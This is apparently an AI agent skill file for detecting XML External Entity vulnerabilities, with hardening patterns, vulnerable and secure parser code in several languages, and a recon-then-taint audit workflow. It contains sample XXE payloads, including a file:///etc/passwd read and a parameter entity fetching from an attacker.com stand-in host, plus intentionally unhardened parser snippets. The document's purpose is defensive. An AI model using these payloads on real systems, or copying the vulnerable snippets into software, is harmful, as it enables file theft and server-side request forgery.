---
name: xxe
description: >-
  Detect XML External Entity (XXE) vulnerabilities in a codebase using a
  two-phase approach: first find all XML parsing sites where external entity
  resolution is not explicitly disabled, then trace whether user-supplied input
  reaches those parsers. Use when asked to find XXE
  or XML injection bugs.
---

# XML External Entity (XXE) Detection

You are performing a focused security assessment to find XXE vulnerabilities in a codebase. This skill uses a two-phase approach with subagents: **recon** (find all XML parsing sites where external entities are not safely disabled) then **taint** (confirm whether user-supplied input reaches those parsers).

---

## What is XXE

XXE occurs when an XML parser processes a document containing a reference to an external entity and the parser has external entity resolution enabled. An attacker who can supply XML input can use this to read arbitrary local files, perform server-side request forgery (internal network probing), trigger denial-of-service via entity expansion (Billion Laughs), or in some stacks execute OS commands.

The core pattern: *user-controlled XML reaches an XML parser that has not disabled DTD processing or external entity resolution.*

### What XXE IS

- XML parsed with external entity resolution **enabled by default** and no explicit hardening applied
- `SYSTEM` entity declarations that reference `file://` or `http://` URIs: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- DTD processing not explicitly disabled in parsers where it is on by default (Java DOM/SAX, PHP SimpleXML/DOMDocument, libxml2-backed parsers)
- Parameter entity injection in DTDs: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
- XInclude injection when XInclude processing is enabled
- SSRF via XXE: using `http://` or `https://` external entity URLs to reach internal services
- Blind XXE via out-of-band exfiltration (DNS, HTTP callback to attacker-controlled server)

### What XXE is NOT

Do not flag these as XXE:

- **XSS via XML**: XML data rendered as HTML without escaping — that's XSS
- **SSRF via non-XML**: HTTP requests triggered by other mechanisms — that's SSRF
- **XML parsing of fully server-controlled data**: Config files, bundled resources, migration scripts with no user influence — not exploitable
- **Safe parsers**: Libraries that disable external entities by default and provide no way to re-enable them (e.g. `defusedxml` in Python, `nokogiri` with default settings in Ruby for untrusted input)

### Patterns That Prevent XXE

When you see these patterns, the parser is likely **not vulnerable**:

**1. Disabling DTD / external entities (Java DOM)**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**2. Disabling external entities (Java SAX)**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**3. Disabling external entities (Java StAX / XMLInputFactory)**
```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

**4. Python — defusedxml (always safe)**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(source)  # external entities, DTD, entity expansion all blocked
```

**5. Python — lxml with resolve_entities=False**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

**6. PHP — libxml_disable_entity_loader (PHP < 8.0) / LIBXML_NONET flag**
```php
libxml_disable_entity_loader(true);   // PHP 7.x — disables external entity loading
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_NONET);  // LIBXML_NONET blocks network
// Note: LIBXML_NOENT alone EXPANDS entities — it does NOT disable them
```

**7. .NET — XmlReaderSettings with DtdProcessing.Prohibit**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**8. Node.js — xml2js (safe by default in v0.5+)**
```javascript
const xml2js = require('xml2js');
// xml2js does not resolve external entities by default — safe
xml2js.parseString(xmlInput, callback);
```

---

## Vulnerable vs. Secure Examples

### Python — stdlib xml.etree.ElementTree (vulnerable by default in CPython < 3.8 / expat quirks)

```python
# VULNERABLE: ElementTree parses DTDs; stdlib does NOT protect against all XXE
import xml.etree.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # no hardening — expat may resolve entities
    return process(tree)

# SECURE: use defusedxml drop-in replacement
import defusedxml.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # defusedxml blocks all XXE vectors
    return process(tree)
```

### Python — lxml

```python
# VULNERABLE: lxml resolves external entities by default
from lxml import etree
def parse_upload(request):
    data = request.body
    tree = etree.fromstring(data)    # external entities resolved, network access allowed
    return render(tree)

# SECURE: disable entity resolution and network access
from lxml import etree
def parse_upload(request):
    data = request.body
    parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
    tree = etree.fromstring(data, parser)
    return render(tree)
```

### Java — DocumentBuilder (DOM)

```java
// VULNERABLE: default DocumentBuilder resolves external entities
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}

// SECURE: disable DTD and external entity features
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setExpandEntityReferences(false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}
```

### Java — SAXParser

```java
// VULNERABLE: default SAXParser allows external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// SECURE: disable external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);
```

### Java — XMLInputFactory (StAX)

```java
// VULNERABLE: default XMLInputFactory supports external entities
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);

// SECURE: disable external entity support
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);
```

### PHP — SimpleXML / DOMDocument

```php
// VULNERABLE: simplexml_load_string with no entity loader disabled
function parseXml($xml) {
    return simplexml_load_string($xml);  // resolves external entities
}

// VULNERABLE: DOMDocument without protection
function parseXml($xml) {
    $doc = new DOMDocument();
    $doc->loadXML($xml);   // external entities enabled by default
    return $doc;
}

// SECURE (PHP 7.x): disable entity loader before parsing
function parseXml($xml) {
    libxml_disable_entity_loader(true);
    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NONET);
    return $doc;
}
```

### .NET — XmlDocument / XmlTextReader

```csharp
// VULNERABLE: XmlDocument with default XmlUrlResolver resolves external entities
XmlDocument doc = new XmlDocument();
doc.Load(stream);   // external entities resolved

// VULNERABLE: XmlTextReader (legacy) — DTD processing on by default in old .NET
XmlTextReader reader = new XmlTextReader(stream);

// SECURE: XmlDocument with null resolver and prohibited DTD
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;   // disables external entity resolution
doc.Load(stream);

// SECURE: XmlReader with DtdProcessing.Prohibit
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
XmlReader reader = XmlReader.Create(stream, settings);
```

### Node.js — libxmljs

```javascript
// VULNERABLE: libxmljs parses with entity resolution on by default
const libxml = require('libxmljs');
app.post('/parse', (req, res) => {
    const doc = libxml.parseXmlString(req.body);
    res.send(doc.toString());
});

// SAFER: no built-in safe flag — avoid libxmljs for untrusted input entirely
// Prefer xml2js or a non-libxml2-backed parser
```

### Ruby — Nokogiri

```ruby
# VULNERABLE: Nokogiri with NOENT option enables entity substitution
def parse_xml(xml_input)
  Nokogiri::XML(xml_input) { |config| config.noent }
end

# SECURE: default Nokogiri (no options) — safe for untrusted input
def parse_xml(xml_input)
  Nokogiri::XML(xml_input)
end
```

### Go — encoding/xml

```go
// VULNERABLE: Go's encoding/xml does not resolve external entities
// but if combined with a third-party parser like etree with network enabled:
import "github.com/beevik/etree"

func parseXML(data []byte) {
    doc := etree.NewDocument()
    doc.ReadFromBytes(data)   // check library's entity resolution behaviour
}

// Go's standard encoding/xml: does not resolve external entities — generally safe.
// Flag only if a third-party XML library with entity support is used.
```

---

## Execution

### Phase 1: Find Vulnerable XML Parsing Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where XML is parsed without external entity resolution being explicitly disabled. Write results to `Phase 1 findings`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, XML libraries in use, and any XML-accepting endpoints.
>
> **What to search for — vulnerable XML parsing patterns**:
>
> Flag any XML parsing call where there is **no adjacent, paired hardening** (disabling DTD / external entity features). You are not yet tracing whether the input is user-controlled; that is Phase 2's job.
>
> 1. **Python — stdlib parsers (flag unless defusedxml is used as a drop-in)**:
>    - `xml.etree.ElementTree.parse(...)`, `ET.fromstring(...)`, `ET.iterparse(...)`
>    - `xml.dom.minidom.parseString(...)`, `xml.dom.minidom.parse(...)`
>    - `xml.sax.parseString(...)`, `xml.sax.parse(...)`
>    - `xmltodict.parse(...)` (backed by expat — generally safe for entity expansion, but flag for review)
>
> 2. **Python — lxml (flag unless `resolve_entities=False` and `no_network=True` are set)**:
>    - `etree.parse(...)`, `etree.fromstring(...)`, `etree.XML(...)`
>    - `etree.XMLParser(...)` without `resolve_entities=False`
>    - `objectify.parse(...)`, `objectify.fromstring(...)`
>
> 3. **Java — flag any instantiation of these without the matching hardening features set**:
>    - `DocumentBuilderFactory.newInstance()` → `newDocumentBuilder()` → `parse(...)`
>    - `SAXParserFactory.newInstance()` → `newSAXParser()` → `parse(...)`
>    - `XMLInputFactory.newInstance()` → `createXMLStreamReader(...)`
>    - `TransformerFactory.newInstance()` → `newTransformer()` used with XML source
>    - `SchemaFactory.newInstance(...)` → `newSchema(...)`
>    - Spring: `MarshallingHttpMessageConverter` with `Jaxb2Marshaller` if entity expansion not disabled
>
> 4. **PHP — flag any of these without `libxml_disable_entity_loader(true)` immediately before (PHP 7.x), or without `LIBXML_NONET` flag (PHP 8.x)**:
>    - `simplexml_load_string(...)`, `simplexml_load_file(...)`
>    - `DOMDocument::loadXML(...)`, `DOMDocument::load(...)`
>    - `xml_parse(...)` with `xml_parser_create()`
>    - `SimpleXMLElement::__construct(...)` with raw string
>
> 5. **.NET — flag any of these without `DtdProcessing.Prohibit` and `XmlResolver = null`**:
>    - `new XmlDocument()` followed by `.Load(...)` or `.LoadXml(...)`
>    - `new XmlTextReader(...)` (legacy — DTD on by default in older .NET)
>    - `XPathDocument(...)`, `XDocument.Load(...)`, `XElement.Load(...)`
>    - `XmlReader.Create(...)` without `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }`
>
> 6. **Node.js — flag these libraries when parsing untrusted input**:
>    - `libxmljs.parseXmlString(...)`, `libxmljs.parseXml(...)`
>    - `node-expat` parser instantiation
>    - `sax.createStream(...)` / `sax.parser(...)` — check if entity expansion is used
>    - `xml2js.parseString(...)` — generally safe in v0.5+; flag only if `explicitArray` or other options suggest an older version or entity expansion is re-enabled
>
> 7. **Ruby — flag these when used with options that enable entity expansion**:
>    - `Nokogiri::XML(input) { |config| config.noent }` — `noent` enables entity substitution
>    - `REXML::Document.new(input)` — REXML is vulnerable to entity expansion DoS; check for entity expansion usage
>    - `LibXML::XML::Document.string(input)` — check entity options
>
> 8. **Go — flag third-party XML libraries that support entity resolution**:
>    - `github.com/beevik/etree` usage — check if network/entity resolution is configured
>    - Standard `encoding/xml` is generally safe (does not resolve external entities) — flag only if combined with custom entity handling
>
> **What to skip** (these are safe patterns — do not flag):
> - `import defusedxml` used as the XML parser (Python)
> - `etree.XMLParser(resolve_entities=False, no_network=True)` (lxml)
> - Java `DocumentBuilderFactory` with `disallow-doctype-decl` feature set to `true`
> - Java `XMLInputFactory` with `IS_SUPPORTING_EXTERNAL_ENTITIES = false`
> - .NET `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }`
> - Nokogiri default usage without `noent` or other entity-expansion options
> - Parsing of fully static, bundled, non-user-influenced XML files (e.g. reading config from disk at startup with no user input involved)
>
> **Output format** — return findings in your response in this format:
>
> ```markdown
> # XXE Recon: [Project Name]
>
> ## Summary
> Found [N] XML parsing sites without explicit external entity hardening.
>
> ## Vulnerable Parsing Sites
>
> ### 1. [Descriptive name — e.g., "lxml.etree.fromstring without resolve_entities=False in upload handler"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Parser / library**: [e.g., lxml etree / Java DocumentBuilder / PHP DOMDocument]
> - **Missing hardening**: [what protection is absent — e.g., "resolve_entities not set to False", "disallow-doctype-decl feature not set"]
> - **Input variable(s)**: `var_name` — [brief note on what it appears to be, e.g., "HTTP request body" or "file upload content" or "unknown origin"]
> - **Code snippet**:
>   ```
>   [the XML parsing call and surrounding context]
>   ```
>
> [Repeat for each site]
> ```

### Between Phases: Check Recon Results

```
No vulnerabilities found.
```

Only proceed to Phase 2 if at least one vulnerable parsing site was identified in the recon output.

### Phase 2: Trace User Input to Vulnerable Parsing Sites

Launch a second subagent **after Phase 1 completes**, providing Phase 1 findings as context. Instructions:

>
> **Context**: You will be given the project's architecture summary and the Phase 1 recon output. Use the architecture to understand request entry points, middleware, file upload handlers, and how data flows through the application.
>
> **For each parsing site, trace the XML input variable(s) backwards to their origin**:
>
> 1. **Direct user input** — the XML content is assigned directly from a request source:
>    - HTTP request body (especially `Content-Type: application/xml` or `text/xml` endpoints): `request.body`, `req.body`, `request.data`, `php://input`, `HttpContext.Request.Body`
>    - File uploads: `request.FILES`, `req.file`, `multipart/form-data` fields
>    - HTTP query params or form fields containing XML snippets
>    - URL path parameters that reference XML resources
>
> 2. **Indirect user input** — the XML is derived from user input through transformations or intermediate steps:
>    - A file path supplied by the user is used to open and parse a file
>    - A URL supplied by the user is fetched and the response is parsed as XML
>    - User input is embedded into an XML template before parsing (potential injection into the XML structure itself)
>    - Variable passed through helper functions — trace the full call chain
>
> 3. **Second-order input** — the XML content was stored (e.g., in the DB or filesystem) from a prior user-controlled upload or input, and is now being parsed:
>    - Find where the stored content was originally written — was it user-supplied at that point?
>    - Was it validated or sanitized at write time?
>
> 4. **Server-side / hardcoded source** — the XML comes from a bundled resource, config file loaded at startup, or server-generated content with no user influence — this site is NOT exploitable.
>
> **For each parsing site, also assess exploitability**:
> - Is the response returned to the caller? (Reflected XXE — attacker can read file contents directly)
> - Is the response not returned, but side effects are observable? (Blind XXE — exfiltration via DNS/HTTP OOB or error messages)
> - Is the application behind authentication? (Reduces severity but does not eliminate the vulnerability)
> - Is the parser used in a context where only specific XML schemas are accepted? (e.g., SOAP envelope validation — still exploitable if DTD processing is on)
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the XML parser and the parser has no external entity hardening. Response or out-of-band channel allows exfiltration.
> - **Likely Vulnerable**: User input probably reaches the parser (indirect flow), or the parser is unhardened but the exploitation path is partially obscured.
> - **Not Vulnerable**: The XML source is fully server-controlled, OR the parser has proper hardening in place (DTD disabled, external entities disabled).
> - **Needs Manual Review**: Cannot determine the input source with confidence, or the hardening configuration is complex and requires runtime verification.
>
> **Output format** — write confirmed findings to `BUG-REPORT.md` using the shared report format from `../SKILL.md`. Read existing `BUG-REPORT.md` first to continue the ID sequence (start at BUG-001 if none exists).
>
> **Severity mapping**:
> - Local file read or internal SSRF → HIGH
> - Limited reachability → MEDIUM
>
> For **Verification**: include the full taint trace and a dynamic test command or payload.
> For **Suggested Commit**: conventional commit message without BUG-IDs.
>
> Do **NOT** write [NOT VULNERABLE] or [NEEDS MANUAL REVIEW] entries to `BUG-REPORT.md`.

---

## Important Reminders

- Phase 2 must run AFTER Phase 1 completes — it depends on Phase 1 results.
- **Phase 1 is purely structural**: flag any XML parsing call that lacks explicit external entity hardening, regardless of where the input comes from. Do not attempt to trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely taint analysis**: for each site found in Phase 1, trace the XML input back to its origin. If it comes from a user-controlled source, the site is a real vulnerability.
- **Parser defaults matter**: Java DOM/SAX, PHP SimpleXML/DOMDocument, and lxml all resolve external entities by default — they require explicit hardening. Python's `defusedxml` and Go's `encoding/xml` are safe by default.
- **Do not confuse `LIBXML_NOENT` with protection**: in PHP, `LIBXML_NOENT` **expands** entities into their values — it does NOT disable entity loading. Only `libxml_disable_entity_loader(true)` or `LIBXML_NONET` provides network-entity protection.
- **XInclude is a separate vector**: if `XIncludeAware` processing is enabled on Java parsers or `xi:include` is processed elsewhere, flag it separately — it can read local files without a classic `ENTITY` declaration.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Taint can flow indirectly: a file upload may be saved to disk in one handler, then parsed in another background job. Trace the full chain including asynchronous processing paths.
- Blind XXE (no output in response) is still exploitable via DNS or HTTP callbacks to attacker-controlled servers. Do not dismiss a finding just because the parsed XML is not echoed back.